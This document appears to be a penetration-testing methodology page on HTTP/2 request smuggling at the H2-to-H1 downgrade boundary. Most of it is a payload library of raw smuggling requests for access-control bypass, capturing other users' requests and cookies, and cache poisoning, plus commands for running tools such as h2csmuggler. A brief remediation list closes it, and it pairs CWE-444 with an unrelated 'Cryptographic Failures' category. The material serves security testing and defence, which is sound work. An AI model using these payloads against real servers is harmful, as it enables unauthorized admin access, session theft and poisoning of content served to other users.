---
title: "HTTP/2 Request Smuggling"
date: 2026-02-24
draft: false
---

# HTTP/2 Request Smuggling

> **Severity**: Critical | **CWE**: CWE-444
> **OWASP**: A02:2021 – Cryptographic Failures / A05:2021 – Security Misconfiguration

---

## What Is HTTP/2 Smuggling?

HTTP/2 uses a binary framing layer with explicit frame lengths — there is **no Content-Length or Transfer-Encoding ambiguity within a true HTTP/2 connection**. Smuggling occurs at the **H2→H1 downgrade boundary**: a front-end proxy accepts HTTP/2 but forwards to a back-end over HTTP/1.1. Two main attack variants:

```
H2.CL — Front-end ignores HTTP/2 framing length,
         uses attacker-supplied Content-Length to forward to backend.
         Backend processes CL but sees extra bytes as a new request.

H2.TE — Front-end strips Transfer-Encoding header received in H2,
         but attacker-supplied TE header survives downgrade.
         Backend sees chunked encoding → processes smuggled prefix.

H2.0   — HTTP/2 cleartext (h2c) upgrade smuggling
         (CONNECT-based tunnel abuse)
```

Key difference from H1 smuggling: HTTP/2 headers are **pseudo-headers** (`:method`, `:path`, `:scheme`, `:authority`) — injecting newlines in header values can create entirely new HTTP/1.1 headers after downgrade.

---

## Discovery Checklist

- [ ] Confirm front-end speaks HTTP/2 (use `curl --http2 -I https://target.com`)
- [ ] Confirm back-end downgrade to HTTP/1.1 (check `Via` or `X-Forwarded-Proto` headers)
- [ ] Test H2.CL: send H2 request with `content-length` header less than actual body
- [ ] Test H2.TE: inject `transfer-encoding: chunked` as custom H2 header
- [ ] Test header injection: embed CRLF `\r\n` in H2 header values
- [ ] Test request line injection via `:path` pseudo-header
- [ ] Test h2c upgrade smuggling (CONNECT method)
- [ ] Use Burp Suite HTTP/2 Repeater (required — standard curl doesn't expose H2 headers easily)
- [ ] Use `smuggler.py` with H2 mode
- [ ] Look for timing differences (>5s gap vs normal response)
- [ ] Check if target uses nghttp2, envoy, nginx, haproxy, apache, IIS as front-end

---

## Payload Library

### Attack 1 — H2.CL (Content-Length Desync)

The front-end sees the full HTTP/2 frame, but forwards using the attacker-specified `content-length` which is shorter than the body. The leftover bytes are prepended to the next request.

```
# HTTP/2 request as seen by front-end (binary framing, full body):
:method POST
:path /
:scheme https
:authority target.com
content-type application/x-www-form-urlencoded
content-length 0        ← attacker sets CL=0 (or short value)

GET /admin HTTP/1.1
Host: target.com
Content-Length: 10

x=1
```

```bash
# H2.CL basic detection — using Burp Repeater (HTTP/2 must be enabled):
# Set Content-Length header to 0 in HTTP/2 request
# Body:
# GET /404page HTTP/1.1
# Host: target.com
# Content-Length: 5
#
# x=1
#
# Send twice: 2nd request should hit /404page → confirms smuggling

# H2.CL to smuggle prefix:
POST / HTTP/2
Host: target.com
Content-Length: 0
[empty line]
GET /admin HTTP/1.1
Host: target.com
```

### Attack 2 — H2.TE (Transfer-Encoding Injection)

Some front-ends pass custom headers including `transfer-encoding` through to the H1 back-end.

```
# HTTP/2 request with injected TE:
:method POST
:path /
:scheme https
:authority target.com
content-type application/x-www-form-urlencoded
transfer-encoding chunked        ← injected TE header

0

GET /admin HTTP/1.1
Host: target.com
X-Ignore: x
```

```bash
# H2.TE payload structure:
# Line 1: chunk size 0 (terminates chunked body for front-end)
# Line 2+: smuggled request prefix for backend

# Burp Suite HTTP/2 repeater payload:
# Add header:  transfer-encoding: chunked
# Body:
# 0
#
# GET /admin HTTP/1.1
# Host: target.com
# Foo: bar
```

### Attack 3 — CRLF Injection via H2 Header Values

HTTP/2 prohibits CRLF in header values, but some implementations don't enforce this. When downgraded to H1.1, injected CRLFs create new headers.

```
# Inject newline in header value to add extra headers:
# H2 header:
foo: bar\r\nTransfer-Encoding: chunked

# Downgraded H1.1 becomes:
Foo: bar
Transfer-Encoding: chunked

# Inject into :path pseudo-header:
:path /page\r\nTransfer-Encoding: chunked

# After downgrade:
GET /page HTTP/1.1
Transfer-Encoding: chunked
...
```

```bash
# Using Burp HTTP/2 Inspector:
# In the header name or value field, use \r\n to inject new lines
# Burp allows editing raw H2 frames — inject null bytes or CRLF

# Test header name injection:
# Header: "foo: injected\r\nX-Extra: value"
# Test header value with embedded colon:
# Header name: "foo\r\nbar"

# curl with H2 CRLF injection (for testing, not all versions support):
curl --http2 -H $'x-test: val\r\nTransfer-Encoding: chunked' https://target.com/
```

### Attack 4 — H2.0 / h2c Smuggling (Cleartext Upgrade)

Some proxies forward `Upgrade: h2c` requests to back-ends without sanitizing the upgrade. The backend establishes HTTP/2 cleartext, allowing tunnel-based smuggling.

```bash
# h2c upgrade request:
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings

# If proxy forwards this and backend supports h2c:
# → Attacker can tunnel arbitrary requests through the established H2 stream

# Tool: h2cSmuggler
git clone https://github.com/BishopFox/h2csmuggler
python3 h2csmuggler.py -x https://target.com/ https://target.com/admin

# Enumerate accessible internal paths via h2c tunnel:
python3 h2csmuggler.py -x https://target.com/ -t -w wordlist.txt
```

### Attack 5 — Request Tunneling (Blind H2)

When the front-end uses a persistent HTTP/2 connection but the back-end gets separate H1 connections, full tunneling attacks work differently — the prefix is not shared with other users but can be used to bypass access controls.

```
# Tunnel a POST to read internal headers from backend:
POST /api/endpoint HTTP/2
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: [length of entire smuggled request]

GET /internal/admin HTTP/1.1
Host: backend.internal
Content-Length: 5

x=1
```

```bash
# Detect via HEAD request tunneling:
# Send HEAD + GET combo where backend processes the GET
# and includes the response body in HEAD reply

HEAD / HTTP/2
Host: target.com
[smuggle GET /admin in body via CL mismatch]

# Tunnel with connection persistence check:
# Legitimate response has CL X
# Smuggled response changes length → mismatch = indicator
```

### Attack 6 — Bypass Front-End Access Controls

```
# Target: /admin requires IP allowlist at front-end, not at back-end

# H2.CL payload to smuggle admin request:
POST /harmless HTTP/2
Host: target.com
Content-Length: 0

GET /admin HTTP/1.1
Host: target.com
Content-Length: 30

GET / HTTP/1.1
Host: target.com
```

```bash
# With Burp Repeater in H2 mode:
# 1. Add "Content-Length: 0" header
# 2. Set body to:
#    GET /admin HTTP/1.1
#    Host: target.com
#    X-Forwarded-For: 127.0.0.1
#
# 3. Send twice in rapid succession
# 4. Second request gets combined with smuggled prefix
```

### Attack 7 — Capture Next User's Request

```bash
# Smuggle request prefix that causes next victim's request
# to be appended to attacker-controlled endpoint:

POST /comment HTTP/2
Host: target.com
Content-Length: 0

POST /comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 800

body=stolen:
# The next victim's request headers (including cookies) are appended
# to this body and stored in the comment

# Retrieve captured data:
GET /comments?latest=1 HTTP/2
Host: target.com
```

### Attack 8 — HTTP/2 Pseudo-Header Injection

```bash
# Inject into :scheme pseudo-header:
:scheme https\r\nTransfer-Encoding: chunked

# Inject into :authority:
:authority target.com\r\nX-Forwarded-Host: attacker.com

# Inject into :method:
:method GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\nGET
# → after downgrade, rewrites request path

# Path confusion with null byte:
:path /api%00/../admin

# Double-slash or encoded path bypass:
:path //admin
:path /api/%2e%2e/admin
```

### Attack 9 — Cache Poisoning via H2 Smuggling

```bash
# Poison cache entry for /home with response from /admin:
POST / HTTP/2
Host: target.com
Content-Length: 0

GET /home HTTP/1.1
Host: target.com
X-Cache-Poison: 1
Content-Length: 30

GET /admin HTTP/1.1
Host: target.com

# Subsequent users requesting /home get the /admin response
# (if caching is present and not checking response integrity)
```

---

## Tools

```bash
# Burp Suite (essential for H2 smuggling):
# - Enable HTTP/2 in Project Options > HTTP > HTTP/2
# - Use Repeater with HTTP/2 protocol selected
# - "HTTP Request Smuggler" Burp extension (BApp Store)
# - Inspect/modify H2 frames in HTTP/2 Inspector tab

# smuggler.py — automated H2 smuggling detection:
git clone https://github.com/defparam/smuggler
python3 smuggler.py -u https://target.com/ --http2

# h2cSmuggler — h2c cleartext upgrade attacks:
git clone https://github.com/BishopFox/h2csmuggler
python3 h2csmuggler.py --help

# nghttp2 — low-level H2 frame inspection:
apt install nghttp2-client
nghttp -v https://target.com/           # verbose H2 frames
nghttp -H ":method: POST" -d /tmp/body https://target.com/

# curl with H2:
curl --http2 -v https://target.com/     # force HTTP/2
curl --http2-prior-knowledge https://target.com/  # skip ALPN negotiation

# Detect H2 support:
curl -sI --http2 https://target.com/ | grep -i "http/2\|via\|upgrade"
openssl s_client -connect target.com:443 -alpn h2  # check ALPN negotiation

# Python h2 library for custom frame injection:
pip3 install h2 hyper
python3 -c "import h2; print(h2.__version__)"
```

---

## Remediation Reference

- **End-to-end HTTP/2**: use HTTP/2 throughout — do not downgrade to H1.1 at the back-end
- **Normalize H2 headers**: reject requests with `\r\n` in header names/values before downgrade
- **Strip hop-by-hop headers**: remove `Transfer-Encoding` from H2 requests before forwarding
- **Reject ambiguous Content-Length**: if Content-Length mismatches H2 DATA frame length, reject
- **Disable h2c upgrade** on proxies unless explicitly required
- **Use consistent server stack**: single-vendor proxy+backend reduces desync risk
- **HAProxy**: use `option http-server-close` + `http-request deny if` for anomalous CL values

*Part of the Web Application Penetration Testing Methodology series.*
